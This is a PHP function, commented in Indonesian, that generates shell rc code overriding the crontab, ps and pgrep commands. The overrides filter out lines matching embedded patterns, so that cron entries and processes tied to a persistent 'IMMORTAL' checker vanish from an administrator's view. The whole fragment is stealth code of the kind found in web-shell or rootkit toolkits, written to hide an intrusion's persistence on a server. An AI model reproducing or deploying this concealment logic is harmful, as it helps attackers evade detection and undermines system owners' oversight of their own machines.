/* blok shell POSIX; TIAP baris disuffix ' #GSPSILUMAN' supaya on/off
   konsisten dengan pola per-baris existing. Pola di-embed literal
   single-quoted saat ARM. */
function gsp_sil_rc_block($pats) {
    $ga = gsp_sil_grep_args($pats);
    $L = array();
    /* crontab: filter HANYA listing ('-l' persis, atau '-l' + '-u user');
       subcommand lain (-e, -r, '-' dari stdin) pass-through murni TANPA
       filter — supaya checker IMMORTAL & manajemen cron user tidak rusak */
    $L[] = 'crontab() {';
    $L[] = '    _gspl=0';
    $L[] = '    if [ $# -eq 1 ] && [ "$1" = "-l" ]; then _gspl=1; fi';
    $L[] = '    if [ $# -eq 3 ] && [ "$1" = "-l" ] && [ "$2" = "-u" ]; then _gspl=1; fi';
    $L[] = '    if [ $# -eq 3 ] && [ "$1" = "-u" ] && [ "$3" = "-l" ]; then _gspl=1; fi';
    $L[] = '    if [ "$_gspl" = "1" ]; then';
    $L[] = '        _gspout=$(command crontab "$@" 2>&1); _gsprc=$?';
    $L[] = '        if [ "$_gsprc" -ne 0 ]; then';
    $L[] = '            printf \'%s\n\' "$_gspout" >&2'; // 'no crontab for ...' tampil apa adanya
    $L[] = '        elif [ -n "$_gspout" ]; then';
    $L[] = '            printf \'%s\n\' "$_gspout" | grep -vF' . $ga[0];
    $L[] = '        fi';
    $L[] = '        return "$_gsprc"'; // exit code crontab asli diteruskan
    $L[] = '    fi';
    $L[] = '    command crontab "$@"';
    $L[] = '}';
    /* ps: filter garis berpola; sentinel menjaga regex tidak kosong */
    $L[] = 'ps() {';
    $L[] = '    command ps "$@" | grep -vE \'' . $ga[1] . '\'';
    $L[] = '}';
    /* pgrep: output kosong setelah filter -> return 1 (perilaku pgrep
       normal saat tidak ada match). Hanya hidup di rc interaktif —
       checker IMMORTAL memanggil pgrep dari script terpisah via cron,
       tidak terpengaruh fungsi rc. */
    $L[] = 'pgrep() {';
    $L[] = '    _gspout=$(command pgrep "$@" | grep -vE \'' . $ga[1] . '\')';
    $L[] = '    if [ -n "$_gspout" ]; then printf \'%s\n\' "$_gspout"; else return 1; fi';
    $L[] = '}';
    $blk = '';
    foreach ($L as $ln) $blk .= $ln . ' #GSPSILUMAN' . "\n";
    return $blk;
}
